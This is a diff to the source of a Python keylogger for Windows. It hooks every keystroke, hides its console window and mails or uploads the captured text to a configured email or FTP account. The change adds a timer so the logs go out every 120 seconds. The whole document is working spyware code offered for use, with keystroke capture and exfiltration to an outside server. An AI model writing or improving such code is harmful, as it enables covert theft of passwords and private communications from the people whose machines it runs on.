@@ -12,7 +12,7 @@ except ImportError:
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
 
-blnFTP = "False"  # if using ftp set this to true and configure the options below
+blnFTP = "False"  # if using ftp set this to True and configure the options below
 strFtpServer = ""
 intFtpPort = 21
 strFtpUser = ""
@@ -20,19 +20,24 @@ strFtpPass = ""
 strFtpRemotePath = "/"
 
 intCharPerSend = 1000  # set num of chars before send log
+
+blnUseTime = "False"  # if you prefer to use a timer to send logs, set this to True
+strTimePerSend = 120  # set how often to send logs in seconds
+
 blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace
 
 # function to prevent multiple instances
-mutex = win32event.CreateMutex(None, 1, 'mutex_xp4key')
+mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     exit()
 
-def hide(): # hide cmd window (optional if compiling as .exe)
+def hide():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window, 0)
     return True
-hide()
+# hide window as new thread. Necessary in order to define timer used later
+objTimer = threading.Timer(0, hide);objTimer.start()
 
 # open file in notepad if argument is given
 if len(sys.argv) == 2:
@@ -42,8 +47,8 @@ if len(sys.argv) == 2:
 blnStop = "False"
 
 def OnKeyboardEvent(event):
-    global strLogs
-    try: # check to see if variable is defined
+    global strLogs, objTimer
+    try:  # check to see if variable is defined
         strLogs
     except NameError:
         strLogs = ""
@@ -131,14 +136,24 @@ def OnKeyboardEvent(event):
             # since event.Key outputs all keys as uppercase, lower normal ones
             strLogs = strLogs + ((event.Key).lower())
 
-    if len(strLogs) >= intCharPerSend:  # send message
-        if blnFTP == "True":
-            SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop))
-            SendFTPThread.start()
-        else:
-            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
-            SendMailThread.start()
-        strLogs = ""
+    def CreateNewThreadMail():  # function for creating thread for sending messages
+        if not strLogs == "":  # if the log is not empty
+            if blnFTP == "True":
+                SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop))
+                SendFTPThread.start()
+            else:
+                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
+                SendMailThread.start()
+
+    if blnUseTime == "True":  # if the user is sending messages by timer
+        if not objTimer.is_alive():  # check to see if the timer is not active
+            objTimer = threading.Timer(strTimePerSend, CreateNewThreadMail)
+            objTimer.start()
+            strLogs = ""
+    else:
+        if len(strLogs) >= intCharPerSend:  # send message if log is certain length
+            CreateNewThreadMail()
+            strLogs = ""
     return True
 
 hooks_manager = pyHook.HookManager()
